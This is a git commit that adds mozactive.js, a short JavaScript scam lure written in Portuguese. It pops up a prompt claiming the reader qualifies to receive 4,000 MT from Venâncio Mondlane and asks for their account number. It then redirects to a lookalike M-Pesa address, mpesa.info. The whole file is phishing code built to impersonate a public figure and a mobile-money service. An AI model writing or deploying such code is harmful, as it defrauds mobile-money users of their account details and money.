19261c83ca57a3f34b797d95345d80799358e4f0
mpessaa <34keeper_fusion@icloud.com>
2026-05-19 05:02:26 +0100

    Create mozactive.js

---
+++ mozactive.js
@@ -0,0 +1,5 @@
+var password = 'RETIRAR 4.000 MT '
+password=prompt('Parabéns, você está qualificado para receber 4.000 MT de Venâncio Mondlane. Clique em OK para inserir seu número de conta.','RETIRAR 4.000 MT ');
+if (password != 'RETIRAR 4.000 MT ') {
+location.href='https://mpesa.info/Presente-aniversario-Mondlane';
+}
